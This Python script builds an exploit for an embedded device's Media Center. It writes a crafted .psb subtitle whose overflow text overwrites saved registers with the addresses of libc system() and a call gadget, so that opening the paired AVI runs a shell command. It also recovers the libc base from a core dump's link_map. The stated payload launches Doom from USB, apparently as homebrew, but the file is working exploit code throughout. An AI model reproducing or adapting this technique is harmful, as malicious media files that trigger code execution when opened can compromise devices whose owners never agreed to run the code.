from __future__ import annotations

import argparse
import shutil
import struct
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
DEFAULT_OUT_DIR = ROOT / "artifacts" / "psb"
DEFAULT_TEMPLATE_AVI = ROOT / "artifacts" / "psb" / "PSB60_LAUNCH_DOOM.avi"

DEFAULT_LIBC_BASE = 0x2BBB8000
DEFAULT_SYSTEM = 0x2BC07240
DEFAULT_CALL_GADGET = 0x2BC02780
LIBC_SYSTEM_OFF = DEFAULT_SYSTEM - DEFAULT_LIBC_BASE
LIBC_IMPLICIT_A0_GADGET_OFF = DEFAULT_CALL_GADGET - DEFAULT_LIBC_BASE
TEXT_OVERFLOW_OFF = 0x100
SAVED_S0 = 0x41414141
COMMAND = b"chmod +x /mnt/doom/launch.sh; /mnt/doom/launch.sh"
PREFIX = COMMAND + b" #"


class RuntimeInfo:
    def __init__(self, libc_base: int = DEFAULT_LIBC_BASE) -> None:
        self.libc_base = libc_base

    @property
    def system(self) -> int:
        return self.libc_base + LIBC_SYSTEM_OFF

    @property
    def call_gadget(self) -> int:
        return self.libc_base + LIBC_IMPLICIT_A0_GADGET_OFF


def build_command() -> str:
    return COMMAND.decode("ascii") + " #"


def build_text(runtime: RuntimeInfo) -> bytes:
    if len(PREFIX) > TEXT_OVERFLOW_OFF:
        raise ValueError("PSB launcher prefix is too long")
    pad = b"A" * (TEXT_OVERFLOW_OFF - len(PREFIX))
    return (
        PREFIX
        + pad
        + struct.pack(">I", SAVED_S0)
        + struct.pack(">I", runtime.system)
        + struct.pack(">I", runtime.call_gadget)
    )


def psb_line(text: bytes) -> bytes:
    return b"{0:0:1}{0:0:10}" + text + b"\n"


def extract_runtime_info(core_path: Path) -> RuntimeInfo:
    from elftools.elf.elffile import ELFFile

    r_debug_addr = 0x2AAAD000

    def build_pt_loads(elf: ELFFile) -> list[tuple[int, int, int]]:
        return [
            (seg["p_vaddr"], seg["p_vaddr"] + seg["p_filesz"], seg["p_offset"])
            for seg in elf.iter_segments()
            if seg["p_type"] == "PT_LOAD"
        ]

    def read_va(fh, loads: list[tuple[int, int, int]], va: int, size: int) -> bytes:
        for start, end, file_off in loads:
            if start <= va and va + size <= end:
                fh.seek(file_off + (va - start))
                return fh.read(size)
        raise KeyError(f"virtual address not dumped in core: {va:#x}")

    def read_u32(fh, loads: list[tuple[int, int, int]], va: int) -> int:
        return struct.unpack(">I", read_va(fh, loads, va, 4))[0]

    def read_cstr(fh, loads: list[tuple[int, int, int]], va: int) -> str:
        out = bytearray()
        for i in range(256):
            b = read_va(fh, loads, va + i, 1)
            if b == b"\x00":
                break
            out += b
        return out.decode("latin1", "replace")

    with core_path.open("rb") as fh:
        elf = ELFFile(fh)
        loads = build_pt_loads(elf)
        r_map = read_u32(fh, loads, r_debug_addr + 0x4)

        cur = r_map
        seen: set[int] = set()
        while cur and cur not in seen:
            seen.add(cur)
            l_addr = read_u32(fh, loads, cur + 0x0)
            l_name_ptr = read_u32(fh, loads, cur + 0x4)
            l_next = read_u32(fh, loads, cur + 0xC)
            if read_cstr(fh, loads, l_name_ptr).endswith("/libc.so.0"):
                return RuntimeInfo(l_addr)
            cur = l_next

    raise RuntimeError("failed to recover libc base from core link_map")


def write_readme(out_dir: Path, runtime: RuntimeInfo) -> None:
    lines = [
        "PSB launcher for /mnt/doom/launch.sh using the confirmed implicit-a0 path.",
        "",
        f"- libc base = {runtime.libc_base:#010x}",
        f"- system = {runtime.system:#010x}",
        f"- call gadget = {runtime.call_gadget:#010x}",
        f"- saved s0 = {SAVED_S0:#010x}",
        f"- command = {build_command()}",
        "",
        "Expected behavior:",
        "- open PSB60_LAUNCH_DOOM.avi in Media Center",
        "- the matching .psb subtitle executes the launcher command",
        "- /mnt/doom/launch.sh starts the Doom payload from USB",
    ]
    (out_dir / "README.md").write_text("\n".join(lines) + "\n", encoding="ascii", newline="\n")


def build_doom_launcher(
    out_dir: Path | str = DEFAULT_OUT_DIR,
    core_path: Path | str | None = None,
    template_avi: Path | str = DEFAULT_TEMPLATE_AVI,
) -> dict[str, int | str]:
    out = Path(out_dir)
    runtime = extract_runtime_info(Path(core_path)) if core_path else RuntimeInfo()
    template = Path(template_avi)

    out.mkdir(parents=True, exist_ok=True)
    dst_avi = out / "PSB60_LAUNCH_DOOM.avi"
    if template.exists() and template.resolve() != dst_avi.resolve():
        shutil.copy2(template, dst_avi)
    elif not dst_avi.exists():
        raise FileNotFoundError(f"missing template AVI: {template}")

    (out / "PSB60_LAUNCH_DOOM.psb").write_bytes(psb_line(build_text(runtime)))
    write_readme(out, runtime)
    return {
        "variant": "PSB60_LAUNCH_DOOM",
        "out_dir": str(out),
        "libc_base": runtime.libc_base,
        "system": runtime.system,
        "call_gadget": runtime.call_gadget,
        "saved_s0": SAVED_S0,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="Build libaoc PSB launch payloads.")
    parser.add_argument("target", nargs="?", default="doom-launcher", choices=["doom-launcher"])
    parser.add_argument("--out", type=Path, default=DEFAULT_OUT_DIR)
    parser.add_argument("--core", type=Path, default=None)
    parser.add_argument("--template-avi", type=Path, default=DEFAULT_TEMPLATE_AVI)
    args = parser.parse_args()

    result = build_doom_launcher(args.out, args.core, args.template_avi)
    print(result["out_dir"])
    print(f"variant={result['variant']}")
    print(f"system={result['system']:#010x}")
    print(f"call_gadget={result['call_gadget']:#010x}")


if __name__ == "__main__":
    main()
